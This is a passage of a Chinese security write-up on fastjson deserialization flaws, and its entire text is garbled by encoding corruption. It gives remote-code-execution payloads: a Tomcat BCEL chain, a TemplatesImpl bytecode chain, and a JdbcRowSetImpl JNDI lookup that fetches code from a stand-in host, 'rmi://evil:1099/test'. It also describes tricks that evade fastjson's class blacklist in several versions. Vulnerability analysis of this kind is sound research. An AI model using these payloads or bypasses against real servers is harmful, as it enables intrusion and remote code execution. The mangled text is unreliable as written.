ÂáΩÊï∞ÂèÇÊï∞‰∏∫0‰∏™ ÂáΩÊï∞ÁöÑËøîÂõûÁ±ªÂûã‰∏∫CollectionÁöÑÂ≠êÁ±ªÊàñÊú¨Ë∫´„ÄÅMapÁöÑÂ≠êÁ±ªÊàñÊú¨Ë∫´„ÄÅAtomicBoolean„ÄÅAtomicInteger„ÄÅAtomicLong Êó†Áõ∏ÂØπÂ∫îÁöÑsetterÂáΩÊï∞ ÁªèËøá‰∏äËø∞ÁöÑ‰∏§‰∏™Êù°‰ª∂ÊèêÂèñÂêéÔºå‰øùÁïô‰∫ÜÁ¨¶ÂêàÊù°‰ª∂ÁöÑgetterÂíåsetterÔºåÂπ∂‰∫écom/alibaba/fastjson/parser/deserializer/FieldDeserializer.java#setValueÂáΩÊï∞‰∏≠invokeË∞ÉÁî®Ôºå‰πüÂ∞±ÊòØËØ¥ÂÆûÁé∞‰∫ÜÁ±ª‰ººÂèçÂ∫èÂàóÂåñËøáÁ®ã‰∏≠‰∏ªÂä®Ë∞ÉÁî®readObjectÂáΩÊï∞ÁöÑÊïàÊûú„ÄÇ Áü•ÈÅì‰∫Ü‰∏äËø∞ÁöÑÊù°‰ª∂ÔºåÂÖ∂ÂÆûÊàë‰ª¨ÂèØ‰ª•Âà©Áî®‰º†ÂÖ•ÊüêÂ≠óÊÆµÁöÑÊñπÂºèÊù•‰∏ªÂä®Ë∞ÉÁî®Áõ∏ÂÖ≥Á¨¶ÂêàÊù°‰ª∂ÁöÑsetterÂíågetter„ÄÇ‰æãÂ¶ÇÂú®PersonÈáåÈù¢Ê∑ªÂä†‰∏Ä‰∏™setTestÂáΩÊï∞ÔºåÂπ∂Âú®ÈúÄË¶ÅËΩ¨ÂåñÁöÑjson‰∏≠Ê∑ªÂä†&quot;test&quot;:1ÔºåÂ∞Ü‰ºö‰∏ªÂä®Ë∞ÉÁî®setTest„ÄÇ Êàë‰ª¨Âú®Âà©Áî®@typeÊûÑÈÄ†ÊúâÂç±ÂÆ≥ÁöÑÂà©Áî®ÈìæÊó∂Ôºå‰∏ªË¶ÅÂ∞±ÊòØÊü•ÊâæÊúâÂç±ÂÆ≥ÁöÑÊó†ÂèÇÊï∞ÁöÑÊûÑÈÄ†ÂáΩÊï∞„ÄÅÁ¨¶ÂêàÊù°‰ª∂ÁöÑgetterÂíåsetter„ÄÇ 3. Á™ÅÁ†¥parse‰∏çËÉΩË∞ÉÁî®ÊâÄÊúâgettersÁöÑÈôêÂà∂ËøôÈáåÁöÑÁ™ÅÁ†¥ÊÄùË∑Ø‰∏ªË¶ÅÊúâ‰∏§‰∏™Ôºö tomcat bcelÁöÑpoc threedreamÂ∏àÂÇÖÂèëÁé∞ÁöÑÂºïÁî®ÁöÑÊñπÂºè Á¨¨‰∏ÄÁßçÔºöTomcat BCEL POCÊÄùË∑ØËøô‰∏™pocÂ∑ßÂ¶ôÁöÑÂà©Áî®‰∫ÜJSONObject.toStringÂáΩÊï∞ÔºåÂÖàÊù•ÁúãÁúãËøô‰∏™toString Ëøô‰∏™toStringÁªßÊâøËá™JSON ËøôÈáå‰ªñÁõ¥Êé•Ë∞ÉÁî®‰∫ÜtoJSONStringÂáΩÊï∞ ÁúãÂà∞ÂêéÁª≠‰ªñÂ∞ÜÂΩìÂâçËøô‰∏™JSONObjectÂÆû‰æãËøõË°å‰∫Üobj to strÁöÑÊìç‰ΩúÔºå‰πüÂ∞±ÊòØÊàë‰ª¨‰ΩøÁî®ÈùôÊÄÅÂáΩÊï∞JSON.toJSONStringÊù•Â∫èÂàóÂåñÊï∞ÊçÆ‰∏ÄÊ†∑ÔºåËøôÈáåÂ∞Ü‰ºöË∞ÉÁî®ÂΩìÂâçËøô‰∏™Á±ªÁöÑÊâÄÊúâÁ¨¶ÂêàÊù°‰ª∂ÁöÑgettersÔºàËøôÈáåÁöÑÊù°‰ª∂ÊØîË∞ÉÁî®parseÊó∂ÂÆΩÊùæÔºå‰ªñÂØπËøîÂõûÁ±ªÂûãÊó†ÈôêÂà∂Ôºâ„ÄÇ ÈÇ£‰πàÊàë‰ª¨Âè™Ë¶ÅÂú®ÂèçÂ∫èÂàóÂåñËøáÁ®ã‰∏≠ÔºåÊâæÂà∞‰∏ÄÂ§ÑÂèØ‰ª•‰ΩøÁî®JSONObjectË∞ÉÁî®toStringÁöÑÂú∞ÊñπÂ∞±ÂèØ‰ª•‰∫Ü com/alibaba/fastjson/parser/DefaultJSONParser.java#parseObject ËøôÈáåÊúâ‰∏ÄÂ§ÑÂ¶ÇÊûúÂΩìÂâçobject‰∏∫JSONObjectÁ±ªÂûãÊó∂ÔºåÂ∞Ü‰ºöÂØπÂΩìÂâçÁöÑËøô‰∏™keyË∞ÉÁî®toStringÂáΩÊï∞„ÄÇËøôÈáåÂú®Â§ÑÁêÜËøáÁ®ã‰∏≠ÔºåÊàë‰ª¨ÂèØ‰ª•Áü•ÈÅìÂ¶ÇÊûúÈÅáÂà∞{Ôºåfastjson‰ºöÂä†‰∏ÄÂ±ÇJSONObject„ÄÇ ÈÇ£‰πàÔºåÊàë‰ª¨Âè™ÈúÄË¶ÅÊûÑÈÄ†‰∏Ä‰∏™Á±ª‰ºº 1&#123;&#123;some&#125;:x&#125; ËøôÁßçÊñπÂºèÔºåÊ≠§Êó∂ÁöÑkey‰∏∫{}(‰πüÂ∞±ÊòØ‰∏ã‰∏ÄÂ±ÇÁöÑJSONObject)Ôºåvalue‰∏∫x„ÄÇÊàë‰ª¨Â∞±ÂèØ‰ª•‰ΩøÂæófastjsonÂéªË∞ÉÁî®key.toStringÂáΩÊï∞ÔºåËøô‰∏™toStringÁöÑËøáÁ®ã‰πüÂ∞±ÊòØÂ∞ÜkeyË∞ÉÁî®toJSONStringÁöÑËøáÁ®ãÔºåÊÑèÂë≥ÁùÄÂ∞Ü‰ºöË∞ÉÁî®ÂΩìÂâçkeyÂØπË±°ÁöÑÊâÄÊúâgetters„ÄÇÂà∞ËøôÈáåÊàë‰ª¨Â∞±ÂèØ‰ª•‰ΩøparseÂáΩÊï∞Êã•Êúâ‰∏éparseObject‰∏ÄÊ†∑ÁöÑÊâßË°åÊïàÊûúÔºå‰ª•‰∏ãÈù¢ÁöÑpoc‰∏∫‰æã„ÄÇ 123456789&#123;// Á¨¨‰∏ÄÂ±ÇJSONObjectÔºå‰ªñÁöÑkey‰∏∫Âè¶Â§ñ‰∏Ä‰∏™JSONObject &#123;// ‰∏ã‰∏ÄÂ±ÇJSONObjectÔºå‰ªñÁöÑÂÜÖÂÆπÂ∞Ü‰ºöË∞ÉÁî®toJSONString \"x\":&#123;// ÂÖ∑‰ΩìËß¶ÂèëÁÇπ‰∏∫getConnection \"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\", \"driverClassLoader\": &#123;\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"&#125;, \"driverClassName\": \"$$BCEL$$$l$8b$I$A$...\" &#125; &#125;:\"x\"&#125;; Á¨¨‰∫åÁßçÔºö$refÁÇπÂΩìfastjsonÁâàÊú¨&gt;=1.2.36Êó∂ÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®$refÁöÑÊñπÂºèÊù•Ë∞ÉÁî®‰ªªÊÑèÁöÑgetter ‰ª•1.2.48ÁâàÊú¨‰∏∫‰æãÔºåÈ¶ñÂÖàÁúã‰∏Ä‰∏ãÈÅáÂà∞$refÊòØÊÄé‰πàÂ§ÑÁêÜÁöÑ com.alibaba.fastjson.parser.DefaultJSONParser#parseObject#388 ÂΩìÈÅáÂà∞ÂºïÁî®$refËøôÁßçÊñπÂºèÔºå‰ºöÂ¢ûÂä†‰∏Ä‰∏™resolveTaskÔºåÁïôÂú®parseÁªìÊùüÂêéËøõË°åÂ§ÑÁêÜ com.alibaba.fastjson.parser.DefaultJSONParser#handleResovleTask Ë∞ÉÁî®JSONPath.evalÔºåÂÖ≥‰∫éJSONPathÁöÑ‰ªãÁªç ËøôÈáåÁöÑevalÂáΩÊï∞ÊúÄÁªà‰ºöÂéªË∞ÉÁî®JSONPath.getPropertyValueÂáΩÊï∞ÔºàËøôÈáåÂÖ∂ÂÆûÊòØÂèØ‰ª•Ê†πÊçÆÊàë‰ª¨‰º†ÂÖ•ÁöÑÂÜÖÂÆπÂéªË∞ÉÁî®‰∏çÂêåÁöÑSegementÔºåÊØîÂ¶ÇËøôÈáåÁî®‰∫Ü$.valueÁöÑÊñπÂºè‰ΩøÁî®ÁöÑÊòØPropertySegementÔºâ ÂêéÁª≠Â∞±‰∏çËØ¶ÁªÜÂàÜÊûê‰∫ÜÔºåËøôÈáåÂ¶ÇÊûúÂ≠òÂú®Áõ∏Â∫îÁöÑgetterÔºåÂ∞±‰ºöÂéªinvokeËøô‰∏™ÂáΩÊï∞ÔºõÂ¶ÇÊûúÊ≤°ÊúâÔºåÈÇ£‰πàÂ∞±‰ºöÁî®ÂèçÂ∞ÑÊú∫Âà∂ÂéªËé∑ÂèñÂ±ûÊÄßÁöÑÂÄº„ÄÇ ËøôÈáå‰∏æ‰∏™‰æãÂ≠ê 123456json = \"&#123;\" + \"\\\"@type\\\": \\\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\\\",\" + \"\\\"driverClassLoader\\\": &#123;\\\"@type\\\": \\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"&#125;,\" + \"\\\"driverClassName\\\": \\\"$$BCEL$$$l$8b$I$A$...\\\",\" + \"\\\"connection\\\":&#123;\\\"$ref\\\": \\\"$.connection\\\"&#125;\"+ \"&#125;\"; ‰ºöÂéªË∞ÉÁî®getConnectionÂáΩÊï∞ÔºåËøôÈáå‰πüÁ™ÅÁ†¥‰∫ÜparseÂà∞parseObjectÁöÑÊïàÊûú (4). privateÂ±ûÊÄßËøòÊúâ‰∏ÄÁÇπÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÈªòËÆ§fastjonÂú®ËΩ¨ÂåñÊó∂ÔºåÂ¶ÇÊûúÊ≤°ÊúâsetterÂáΩÊï∞ÔºåËÄåÊòØ‰ª•ÂèçÂ∞ÑÊú∫Âà∂Êù•ËµãÂÄºÁöÑÊÉÖÂÜµÔºå‰ºöÂøΩÁï•privateÂ±ûÊÄßÁöÑËΩ¨Âåñ„ÄÇÊÑèÂë≥ÁùÄÂ¶ÇÊûúÊàë‰ª¨Âú®ÊûÑÈÄ†ËøáÁ®ã‰∏≠ÔºåÂ°´ÂÖÖËøõÂéªÁöÑÂ±ûÊÄßÊòØprivateÁöÑ‰∏îÊ≤°ÊúâsetterÔºåÈÇ£‰πàÂú®ËΩ¨ÂåñËøáÁ®ã‰∏≠ÊòØ‰∏ç‰ºöË¢´Â°´ÂÖ•ËøòÂéüÂêéÁöÑÂØπË±°ÁöÑ„ÄÇÂ¶ÇÊûúÈúÄË¶ÅÂØπprivateÂ±ûÊÄßËøõË°åËΩ¨ÂåñÔºåÈÇ£‰πàÈúÄË¶ÅËÆæÁΩÆFeature.SupportNonPublicField 0x02 EXPÂàÜÊûê Áõ∏ÊØî‰∫éJavaÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÊûÑÈÄ†ÁöÑÂ§çÊùÇÊÄßÔºåfastjsonÂà©Áî®Èìæ‰∏ªË¶ÅÊòØÂØªÊâæÂèØÂà©Áî®ÁöÑgetter„ÄÅsetterÁ≠âÔºåÂ∏∏ËßÅÁöÑÂá†ÁßçPOCÂ¶Ç‰∏ãÊñáÊâÄÁ§∫Ôºö (1). templatesimplÂèÇËÄÉÔºöhttp://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/ Ê†πÊçÆÂâçÈù¢ÁöÑÂàÜÊûêÔºåÊàë‰ª¨ÈúÄË¶ÅÊâæÂà∞ÂèØ‰ª•Âà©Áî®ÁöÑÊûÑÈÄ†ÂáΩÊï∞„ÄÅsetterÊàñgetterÂáΩÊï∞„ÄÇÂú®ÂàÜÊûêCommons-CollectionsÁ≥ªÁªüÁöÑÂà©Áî®ÈìæÊó∂ÔºåÊèêÂà∞ËøátemplatesimplÁöÑÊâßË°åÊñπÂºèÔºåÈÄöËøáËΩΩÂÖ•bytecodesÁöÑÊñπÂºèÊù•ËææÂà∞‰ªªÊÑè‰ª£Á†ÅÊâßË°åÁöÑÊïàÊûú(ÂÖ∑‰Ωì‰∏çÂÜçÂàÜÊûê)„ÄÇ ÂÖ∂‰∏≠Ëß¶ÂèëËΩΩÂÖ•ÁöÑÂáΩÊï∞‰∏∫newTransformerÂáΩÊï∞ÔºåËÄåÂæàÂ∑ßÁöÑÊòØÔºåtemplatesimplÂ≠òÂú®‰∏Ä‰∏™getterË∞ÉÁî®‰∫ÜËØ•ÂáΩÊï∞ ÈÇ£‰πàÂæàÊòéÊòæÔºåÊàë‰ª¨ÂèØ‰ª•Áõ¥Êé•Â°´ÂÖ•outputPropertiesÁöÑÊñπÊ≥ïÊù•Ëß¶ÂèëgetOutputPropertiesÔºà‰ªñÊÅ∞Â∑ßÊó†setterÔºåËøîÂõûÂÄº‰πüÁ¨¶ÂêàÊù°‰ª∂Ôºâ„ÄÇ‰ΩÜÊòØÊúâ‰∏Ä‰∏™ÈóÆÈ¢òÊòØÊàë‰ª¨ÈúÄË¶ÅÂ°´ÂÖÖÁöÑÁ±ªÂ±ûÊÄßÈÉΩÊòØprivateÁ±ªÂûãÔºåË¶ÅÊÉ≥ÊâßË°åËØ•Âà©Áî®ÈìæÔºåÈúÄË¶ÅÂú®Ë∞ÉÁî®parseObjectÂáΩÊï∞Êó∂Â°´ÂÖ•Feature.SupportNonPublicField„ÄÇ‰ª•‰∏ãÂõæ‰∏∫‰æãÔºåÂ∞ÜË∞ÉÁî®ËÆ°ÁÆóÂô® 1234String jsonString = \"&#123;\\\"@type\\\":\\\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\",\" + \"\\\"_name\\\":\\\"goodjob\\\",\\\"_tfactory\\\":&#123;&#125;,\" + \"\\\"_bytecodes\\\":[\\\"yv66vgAAADQAOgoAA...\\\"],\" + \"\\\"_outputProperties\\\":null&#125;\"; ËøôÈáåÁöÑbytecodesÂèØ‰ª•Áî®ysoserialÂ∑•ÂÖ∑Êù•ÁîüÊàê„ÄÇÂú®ÊûÑÈÄ†payloadÁöÑÊó∂ÂÄôÔºåÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØ_tfactoryÂøÖÈ°ªÂ°´‰∏äÔºåÂõ†‰∏∫Âú®ÊâßË°åËøáÁ®ã‰∏≠ÔºåÂ¶ÇÊûúÂÆÉ‰∏∫nullÔºå‰ºöÊä•ÈîôÊó†Ê≥ïËøõÂÖ•ËΩΩÂÖ•bytecodesÁöÑÊ≠•È™§„ÄÇÈùûÂ∏∏Â•ΩÁöÑÊòØÔºåÊàë‰ª¨Âè™Ë¶ÅÂ°´‰∏ä_tfactory:{}Ôºåfastjson‰ºöËá™Âä®Â∏ÆÊàë‰ª¨Ë∞ÉÁî®TransformerFactoryImplÔºàtfactoryÁöÑÁ±ªÔºâÁöÑÊó†ÂèÇÊûÑÈÄ†ÂáΩÊï∞ËøõË°åÂÆû‰æãÂåñ„ÄÇ`\\`Âú®smartMatchÂáΩÊï∞Ë¢´ÊõøÊç¢‰∏∫Á©∫„ÄÇ Èô§Ê≠§‰πãÂ§ñÔºåbyte[]Á±ªÂûãÂú®fastjsonËΩ¨Âåñ‰∏≠‰ºöË¢´base64ÁºñÁ†Å ÊâÄ‰ª•payload‰∏≠ÊòØ‰∏ÄÈïø‰∏≤base64ÁöÑÂ≠ó‰∏≤„ÄÇ ÂèØ‰ª•ÁúãÂà∞Ëøô‰∏™pocÂÖ∂ÂÆûÈôêÂà∂ËøòÊòØÊå∫Â§ßÁöÑÔºåÈúÄË¶Åfastjson parseObjectÊó∂Â°´‰∏äFeature.SupportNonPublicFieldÊâçÂèØ‰ª•„ÄÇ (2). Âü∫‰∫éJNDIÁöÑÂà©Áî®Êàë‰ª¨ÈÉΩÁü•ÈÅìÂ¶ÇÊûúJNDIÁöÑlookupÂáΩÊï∞ÂèÇÊï∞ÂÄºÂèØÊéßÔºåÈÇ£‰πàÊàë‰ª¨ÂèØ‰ª•Âà©Áî®JNDI ReferenceÁöÑÊñπÊ≥ïÂä†ËΩΩËøúÁ®ã‰ª£Á†ÅËææÊàêRCEÂà©Áî®„ÄÇÊâÄ‰ª•Ê†πÊçÆÂâçÈù¢ÁöÑÂàÜÊûêÔºåÂ¶ÇÊûúÊàë‰ª¨ÂèØ‰ª•Âú®Êó†ÂèÇÊûÑÈÄ†ÂáΩÊï∞„ÄÅÁ¨¶ÂêàÊù°‰ª∂ÁöÑsetter„ÄÅÁ¨¶ÂêàÊù°‰ª∂ÁöÑgetterÈáåÂèëÁé∞‰∏Ä‰∏™ÂèØÊéßÁöÑlookupÂáΩÊï∞ÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•Âà©Áî®JNDIÁöÑÊ≥®ÂÖ•ÊñπÊ≥ïÊù•ËææÊàêÂà©Áî®„ÄÇ JdbcRowSetImplJdbcRowSetImplÂØπË±°ÂèØ‰ª•Ë¢´Êàë‰ª¨Áî®ÂÅö‰∏äËø∞ÁöÑÂà©Áî®ÔºåÊù•Áúã‰∏Ä‰∏ã‰ªñÁöÑ‰ª£Á†Å ËøôÊ¨°Âá∫ÈóÆÈ¢òÁöÑÂú∞ÊñπÂú®‰∫ésetAutoCommitÂáΩÊï∞ÔºåËØ•ÂáΩÊï∞Ë∞ÉÁî®‰∫ÜconnectÂáΩÊï∞Êù•ÈáçÊñ∞ÂèëËµ∑‰∏Ä‰∏™jdbcÁöÑËøûÊé• Âú®connectÂáΩÊï∞ÈáåÊàë‰ª¨ÂèØ‰ª•ÁúãÂà∞Ë∞ÉÁî®‰∫ÜlookupÂáΩÊï∞ÔºåÂÖ∂ÂèÇÊï∞ÂÄºÁî±getDataSourceNameÊù•Ëé∑ÂèñÔºåËØ•ÂáΩÊï∞‰∏ªË¶ÅËøîÂõûÂ±ûÊÄßdataSourceÔºåÊ†πÊçÆfastjsonÁöÑÂà©Áî®ÂéüÁêÜÔºåÊàë‰ª¨Âè™ÈúÄË¶ÅÂ°´ÂÖÖdataSourceÂíåautoCommitÂ∞±ÂèØ‰ª•Ëß¶ÂèëËøôÈáåÁöÑJNDIÊ≥®ÂÖ•„ÄÇ 1&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://evil:1099/test\",\"autoCommit\":true&#125; ËøòÊúâÂæàÂ§öÂÖ∂‰ªñÁöÑÂèØ‰ª•Áî®Êù•JNDIÊ≥®ÂÖ•ÁöÑÂØπË±°ÔºåÊØîÂ¶Çorg.hibernate.jmx.StatisticsServiceÁöÑsetSessionFactoryJNDINameÂáΩÊï∞ÔºåÂéüÁêÜ‰∏ÄÊ†∑‰∏çÂÜçÂèôËø∞„ÄÇ (3). Tomcat dbcp BasicDataSourceÂêå1‰∏≠ÁöÑTemplateImplÔºåBasicDataSource‰πüÂèØ‰ª•ËΩΩÂÖ•‰ªªÊÑèÁöÑÂØπË±°Êù•ÊâßË°å‰ªªÊÑè‰ª£Á†Å„ÄÇÂÖàÊù•ËÆ≤‰∏Ä‰∏ã‰ªñÁöÑÂéüÁêÜ ÂâçÈù¢ÁöÑÂü∫Á°ÄÁü•ËØÜÈáåÊèêÂà∞‰∫ÜÊàë‰ª¨ÂèØ‰ª•Ë∞ÉÁî®Á¨¶ÂêàÊù°‰ª∂ÁöÑgettersÔºåÂú®BasicDataSourceÂ≠òÂú®‰∏Ä‰∏™getConnectionÂáΩÊï∞Ôºå‰ªñ‰∏ªË¶ÅË∞ÉÁî®createConnectionFactory Âú®createConnectionFactoryÂáΩÊï∞‰ΩøÁî®Class.forNameÂä†ËΩΩÁ±ª ËøôÈÉ®ÂàÜdriverClassNameÂíådriverClassLoaderÊòØÂèØÊéßÁöÑÔºåËøôÊó∂ÂÄôÊàë‰ª¨Ë¶ÅÁî®Âà∞ÁöÑÊòØcom.sun.org.apache.bcel.internal.util.ClassLoaderÔºåËøô‰∏™ClassLoaderÂèØ‰ª•‰ªéclassname‰∏≠ÊèêÂèñÂá∫BCELÊ†ºÂºèÁöÑclassÂ≠óËäÇÁ†ÅÔºåÂπ∂Ë∞ÉÁî®defineClassËøõË°åËΩΩÂÖ• ËøôÈáåÊàë‰ª¨ÂèØ‰ª•ÂÜô‰∏Ä‰∏™Áî®‰∫ÜÈùôÊÄÅÂùóÁöÑÁ±ªÊù•ÊâßË°å‰ª£Á†Å„ÄÇ 0x03 FastjsonÂéÜÂè≤ÁâàÊú¨‰øÆÂ§çÊé™ÊñΩ Ëøô‰∏ÄÈÉ®ÂàÜ‰∏ªË¶ÅËÆ≤Ëø∞Âá†‰∏™ÈáçË¶ÅÁâàÊú¨ÁöÑÂÆâÂÖ®Êõ¥Êñ∞ (1). fastjson == 1.2.25ÈªòËÆ§ÂÖ≥Èó≠AutoTypeÔºåÈúÄË¶ÅÊâãÂä®ÂºÄÂêØ@typeÁöÑÊîØÊåÅÔºåËßÅenable_autotype com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object) ÂΩìÈÅáÂà∞@typeÊó∂Ôºå‰ºöÂÖàcom.alibaba.fastjson.parser.ParserConfig#checkAutoType„ÄÇËØ•ÂáΩÊï∞ÁöÑ‰∏Ä‰∏™‰∏ªË¶ÅÈÄªËæëÔºà1.2.25ÁâàÊú¨Ôºâ ÂºÄÂêØ‰∫ÜAutoTypeÊó∂Ôºå‰ºöËøá‰∏ÄÊ¨°ÈªëÂêçÂçïÂíåÁôΩÂêçÂçïÊ£ÄÊµãÔºàÂÖàÊ£ÄÊµãÁôΩÂêçÂçïÔºåÂêéÊ£ÄÊµãÈªëÂêçÂçïÔºâ„ÄÇ ‰ºòÂÖàËΩΩÂÖ•‰∫∫Â∑•ÈÖçÁΩÆÁöÑÁôΩÂêçÂçïÁ±ªÔºåÂπ∂ÂØπÈªëÂêçÂçïÁ±ªÁàÜÂá∫ÂºÇÂ∏∏Ôºõ ËøôÈáåÂÖàÂøΩÁï•Êú™ÂºÄÂêØAutoTypeÊó∂ÁöÑÊ£ÄÊµãÂ§ÑÁêÜ ÂâçÈù¢ÁöÑÊÉÖÂÜµÈÉΩ‰∏çÁ¨¶ÂêàÔºåÂπ∂‰∏îÂºÄÂêØ‰∫ÜAutoTypeÔºåÂàôÂ∞ùËØïÂéªËΩΩÂÖ•‰ªªÊÑèÁ±ªÔºå‰ΩÜÊòØ‰∏çÂèØ‰ª•ËΩΩÂÖ•ClassLoaderÂíåDataSourceÁöÑÂ≠êÁ±ª ËøôÈáåËΩΩÂÖ•ÁöÑÊñπÊ≥ïÁî®ÁöÑÈÉΩÊòØTypeUtils.loadClassÔºåÊù•Áúã‰∏Ä‰∏ã‰ªñÁöÑ‰∏Ä‰∏™Â§ÑÁêÜ È¶ñÂÖà‰ªñÂØπ‰∫éLxxx.class.xxx;ÁöÑÁ±ªË°®Á§∫ÊñπÊ≥ïÂÅöL,;ÁöÑÂâîÈô§ÔºåÈÄíÂΩíË∞ÉÁî®loadClassÂéªË∞ÉÁî®ÂÜÖÈÉ®ÁöÑÂÖ∑‰ΩìÁ±ª ÂêéÁª≠ÁöÑË∞ÉÁî®ÊñπÊ≥ï‰∏∫‰ΩøÁî®AppClassLoader.loadClassÊàñClass.forNameÂéªÂä†ËΩΩÁ±ª ÂºÄÂêØAutoTypeÁöÑÊÉÖÂÜµ‰∏ãÁªïËøáÈªëÂêçÂçïÊ£ÄÊµãÊ†πÊçÆ‰∏äÈù¢ÁöÑÂàÜÊûêÔºåÂ¶ÇÊûúÂºÄÂêØ‰∫ÜAutoTypeÔºåÈÇ£‰πàÂ¶ÇÊûúÊòØÂú®ÁôΩÂêçÂçïÈáåÁöÑÁ±ªÔºåÁõ¥Êé•Âä†ËΩΩÔºåÂØπ‰∫éÂú®ÈªëÂêçÂçïÂÜÖÁöÑÁ±ªÁõ¥Êé•ÊäõÂá∫ÂºÇÂ∏∏„ÄÇ ËÄåÈªëÂêçÂçïÁöÑÊ£ÄÊµãÊñπÂºèÊòØÂéªÂåπÈÖçÂΩìÂâçÁöÑÁ±ªÂêçclass.startsWith(deny) ËÄåÂú®Ëøô‰∏™ÈªëÂêçÂçïÈáåÊòæÁÑ∂Âπ∂Ê≤°ÊúâËÄÉËôëÂà∞TypeUtils.loadClassÂÆûÁé∞‰∏≠ÔºåÂØπ‰∫éLxxxx.class.xxx;ÁöÑÂ§ÑÁêÜ„ÄÇ ÈÄöËøáLxxxxx;ÁöÑÊñπÂºèstartsWithÊ≤°ÂäûÊ≥ïÊ≠£Â∏∏ÂåπÈÖçÂá∫Êù•ÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÁªïËøáÈªëÂêçÂçïÁöÑÊ£ÄÊµã„ÄÇ (2). fastjson == 1.2.42Âú®Ëøô‰∏™ÁâàÊú¨ÔºåÂØπ‰∏äÈù¢ÁöÑÈªëÂêçÂçïÊ£ÄÊµãÁªïËøáÂÅö‰∫Ü‰øÆÂ§çÔºåÂπ∂‰∏îÂ∞ÜÈªëÂêçÂçïÈáåÁöÑÁ±ªÂûãËøõË°åhashÂ§ÑÁêÜÔºåÂ¢ûÂä†‰∫ÜÂàÜÊûêÈöæÂ∫¶Ôºõ ÂØπ‰∫éÂâçÈù¢Lxxxxx;ÁöÑÁªïËøáÔºå42ÁâàÊú¨Ê∑ªÂä†‰∫Ü‰ª•‰∏ã‰ª£Á†ÅÊù•ÂâîÈô§ÔºàÂõ†‰∏∫ÈªëÂêçÂçïÂ∑≤ÁªèÂèòÊàê‰∫ÜhashÊØîËæÉÁöÑÊñπÂºèÔºåËøôÈáåL;ÈÉΩ‰ª•ËøôÁßçÊñπÂºèÊù•Á°ÆËÆ§Ôºâ ‰ΩÜÊòØËøôÈáåÁöÑÂ§ÑÁêÜÊ≤ªÊ†á‰∏çÊ≤ªÊú¨ÔºåÊàë‰ª¨‰ΩøÁî®LLxxxxx;;ËøôÁßçÊñπÂºèÂ∞±ÂèØ‰ª•ÁªïËøá„ÄÇ Èô§Ê≠§‰πãÂ§ñÔºåÁî±‰∫éÁé∞Âú®ÁöÑÈªëÂêçÂçïÂèòÊàê‰∫ÜhashËÆ°ÁÆóÁöÑÊñπÂºèÔºåÁªôÊàë‰ª¨ÂàÜÊûêÂ¢ûÂä†‰∫Ü‰∏çÂ∞ëÈöæÂ∫¶Ôºå‰∏çËøáÊúâÂ§ß‰Ω¨ÂØπÈªëÂêçÂçïhashÂÅö‰∫ÜËøòÂéüËßÅfastjson-blacklist (3). fastjson == 1.2.43Ëøô‰∏™ÁâàÊú¨‰∏ªË¶Å‰øÆÂ§ç‰∫Ü‰∏äÈù¢LLxxxx;;ÁöÑÊñπÂºè ÂÅö‰∫Ü‰∏§Ê¨°Ê£ÄÊµãÔºåÂ¶ÇÊûúÁ¢∞‰∏äLLxxxxx;;ÁöÑÊñπÂºèÂàôÁõ¥Êé•ÁàÜÂá∫ÂºÇÂ∏∏ (4). fastjson == 1.2.48‰øÆÂ§çÂâçÁöÑÁâàÊú¨Âú®48ÁâàÊú¨‰πãÂâçÔºåcheckAutoTypeËøòÂ≠òÂú®ËøôÊ†∑‰∏Ä‰∏™ÈÄªËæëÔºà‰ª•1.2.47‰∏∫‰æãÔºâ ÂΩìÂºÄÂêØAutoTypeÊó∂ÔºåÂ¶ÇÊûúmappingsÈáåÈù¢Â≠òÂú®Ëøô‰∏™Á±ªÔºåÈÇ£‰πàÂ∞±ÁÆóËøô‰∏™Á±ªÂú®ÈªëÂêçÂçïÈáåÔºå‰πüÂÖÅËÆ∏‰ªñËøõË°å‰∏ã‰∏ÄÊ≠•Êìç‰Ωú PSÔºöËøôÈáåÁöÑmappingsÊòØfastjsonÊèêÊó©ËΩΩÂÖ•ÁöÑ‰∏Ä‰∫õÁºìÂ≠òÁ±ª ÂêéÁª≠Â¶ÇÊûúËÉΩ‰ªémappingsÈáåÈù¢ÂæóÂà∞Ëøô‰∏™Á±ªÔºåÂ∞±Áõ¥Êé•ËøîÂõû„ÄÇÈÇ£‰πàÊàë‰ª¨ÊúâÊ≤°Êúâ‰ªÄ‰πàÊñπÊ≥ïÂ∞ÜÊàë‰ª¨ÈúÄË¶ÅÁöÑÁ±ªÂä†ÂÖ•Âà∞Ëøô‰∏™mappingsÈáåÂë¢Ôºü ÂÖàÊù•Áúã‰∏Ä‰∏ãdeserializers.findClassÔºåÂú®deserializersÈáåÈù¢È¢ÑÂÖàÂ°´ÂÖÖ‰∫Ü‰∏Ä‰∫õÁ±ª‰∏éÂÖ∂ÂèçÂ∫èÂàóÂåñÂô®ÁöÑÂÆû‰æã ËøôÈáåÊàë‰ª¨‰∏ªË¶ÅÂÖ≥Ê≥®‰∏Ä‰∏ãClass.classÔºå‰ªñÊâÄÂØπÂ∫îÁöÑÂèçÂ∫èÂàóÂåñÂô®‰∏∫MiscCodecÔºåcheckAutoTypeÊ£ÄÊµãËøáÂêéÔºåÂêéÁª≠Â∞ÜË∞ÉÁî®ÂèçÂ∫èÂàóÂåñÂô®ÁöÑdeserialzeÂáΩÊï∞„ÄÇÊù•ÁúãÁúãMiscCodecÁöÑËøô‰∏™ÂáΩÊï∞ÂØπ‰∫éClass.classÁöÑÂ§ÑÁêÜ 